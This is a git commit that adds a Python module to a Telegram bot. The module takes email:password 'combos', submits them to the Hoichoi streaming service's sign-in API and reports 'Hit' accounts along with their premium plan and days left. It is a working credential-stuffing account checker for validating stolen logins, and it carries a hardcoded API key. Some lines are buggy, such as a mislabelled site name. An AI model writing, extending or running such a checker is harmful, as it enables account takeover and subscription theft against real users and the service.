51f38f6507d6c68cda295ef98e3d011a5fdbce8d
Akash R Chandran <78685510+akashrchandran@users.noreply.github.com>
2021-04-06 00:42:00 +0530

    Added New Checks
    Added new site that is Hoichoi and Zee5.  And removed Hotstar.

---
+++ Bot/Checks/hoichoi.py
@@ -0,0 +1,63 @@
+import requests
+from datetime import date
+from message import Editmessage, Sendmessage, logger
+
+head = {
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
+    'accept': 'application/json, text/plain, */*',
+    'content-type': 'aapplication/json;charset=UTF-8',
+    'origin': 'https://www.hoichoi.tv',
+    'referer': 'https://www.hoichoi.tv/',
+}
+def hoichoi_helper(chat_id, combo):
+    status = Sendmessage(chat_id, '<i>Checking...</i>')
+    if '\n' in combo:
+        try:
+            combo.split('\n')
+            logger.info('More than 1')
+        except Exception as e:
+            logger.info(e)
+    try:
+        combo_split = combo.split(':')
+        inpumail = combo_split[0]
+        inpupass = combo_split[1]
+    except IndexError:
+        return Editmessage(chat_id, 'Enter Valid Combo', status)
+    email= f'"email":"{inpumail}"'
+    password = f'"password":"{inpupass}"'
+    session_request = requests.Session()
+    url = 'https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-f76c181a-94b5-11eb-a8b3-0242ac130003'
+    payload = '{%s,%s}' %(email, password)
+    response = session_request.post(url,headers=head, data=payload)
+    result = response.json()
+    print(result)
+    if response.status_code != 200:
+        print('error')
+        code=result['code']
+        messg = result['error']
+        text = f'<b>Bad Combo ❌</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Code: {code}\nMessage: {messg}\nSite: Hoichoi</b>'
+        Editmessage(chat_id, text, status)
+        return
+    elif result['isSubscribed'] == False:
+        free_text = f'<b>Expired Combo ❌</b>\n<b>Site: Altbalaji</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Expired/Free</b>'
+        Editmessage(chat_id, free_text, status)
+        return
+    user_token = result['authorizationToken']
+    # print(user_token)
+    head2 = {
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
+    'accept': 'application/json, text/plain, */*',
+    'authorization': user_token,
+    'origin': 'https://www.hoichoi.tv',
+'referer':'https://www.hoichoi.tv/',
+'x-api-key':'dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3',
+}
+    url2 = 'https://prod-api.viewlift.com/subscription/user?site=hoichoitv&userId=f76c181a-94b5-11eb-a8b3-0242ac130003'
+    session2 = session_request.get(url2, headers=head2)
+    result2 = session2.json()
+    timedioint = result2["subscriptionInfo"]["subscriptionEndDate"].split('T')[0]
+    sub2split = timedioint.split('-')
+    trial = date(int(sub2split[0]), int(sub2split[1]), int(sub2split[2])) - date.today()
+    pro_message = f'<b>🌟 Hit Combo 💫</b>\n<b>Site: Hoichoi</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Premium\nPlan: {result2["subscriptionPlanInfo"]["name"]}\nDays Left: {trial.days}\nRecurring: {result2["subscriptionPlanInfo"]["renewable"]}</b>'
+    Editmessage(chat_id, pro_message, status)
+    return
